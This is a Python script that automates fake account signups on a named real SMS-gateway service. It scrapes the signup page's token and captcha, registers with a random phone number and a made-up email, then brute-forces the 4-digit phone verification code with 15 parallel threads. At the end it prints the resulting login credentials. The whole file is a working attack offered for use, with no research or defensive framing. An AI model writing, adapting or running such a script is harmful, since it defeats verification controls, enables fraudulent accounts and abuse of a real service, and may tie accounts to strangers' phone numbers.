import random
from threading import Thread
import string
import requests 
import json
from bs4 import BeautifulSoup
from queue import LifoQueue

GUI = True
try:
    import base64
    from PIL import Image
    from io import BytesIO
except:
    print("No GUI detected... running in headless mode.")
    GUI = False



q = LifoQueue()
with open("4digits.txt") as file:
    for line in file:
        otp = line[0:4]
        q.put(otp)
isOtpWrong = True
data_to_append = ""

class Main():
    token = ""
    def showImage(self,captcha):
        encoded_image_data = captcha[23:]
        decoded_image_data = base64.b64decode(encoded_image_data)
        image = Image.open(BytesIO(decoded_image_data))
        image.show()
    def randomNumber(self):
        prefixes = ['017', '013', '018', '019', '015', '016']
        prefix = random.choice(prefixes)
        remaining_digits = ''.join(random.choices('0123456789', k=8))
        return str(prefix + remaining_digits)

    def generate_password(self):
        length = 8
        while True:
            password = ''.join(random.choices(string.ascii_letters + string.digits, k=length))
            if (any(c.isupper() for c in password)
                    and any(c.islower() for c in password)
                    and any(c.isdigit() for c in password)):
                return password

    def getTokenCaptcha(self):
        url ="https://sms.net.bd/signup/" 
        response = requests.get(url)
        soup = BeautifulSoup(response.content, "html.parser")
        script_tags = soup.find_all("script")
        for script_tag in script_tags:
            if "let apiResp" in str(script_tag):
                script = script_tag.string
                start = script.index("=") + 2
                end = script.find(""""}"};""")+4
                data= script[start:end]
                json_data = json.loads(data)
                return json_data["data"]
            
    def createAccount(self):
        data =json.loads(self.getTokenCaptcha()) 
        base64_image_data = data["captcha_image"]
        if not GUI:
            print("please copy and paste the below data on a browser to view the captcha:\n")
            print(base64_image_data+"\n")
        else:
            self.showImage(base64_image_data)
        captcha = input("captcha:")
        self.token = data["token"]
        password = self.generate_password()
        mail = password+"@gmail.com"
        number = self.randomNumber()
        print(f"using {number} and {password} and {mail}")
        data = {
                "name":password,
                "phone":number,
                "email":mail,
                "password": password,
                "password":password,
                "captcha":captcha
                }
        url = f"https://api.sms.net.bd/user/register/{self.token}"
        response = requests.post(url,data) 
        if "A verification code has been sent to your phone" in response.text:
            print("otp has been... preparing to bruteforce")
            global data_to_append
            data_to_append = data
        else:
            print(response.text)
    def tryOtp(self,otp):
        url = f"https://api.sms.net.bd/user/register/{self.token}"
        print(otp)
        response = requests.post(url,data = {"otp_code":otp})
        return response.text
target = Main()
target.createAccount()
def worker():
    global isOtpWrong
    while isOtpWrong:
        otp = q.get()
        res = target.tryOtp(otp)
        if "Invalid" in res:
            pass
        elif "Registration Complete" in res:
            isOtpWrong = False
            print("Registration Complete!")
            break
threads = []
for thread in range(15):
    t1 = Thread(target=worker)
    threads.append(t1)
for thread in threads:
    thread.start()
for thread in threads:
    thread.join()


creds = data_to_append
print("------------------------------------------")
email = creds["email"]
password = creds["password"]
print(f"email: {email}")
print(f"password: {password}")
print("Open https://portal.sms.net.bd/login/ to login")
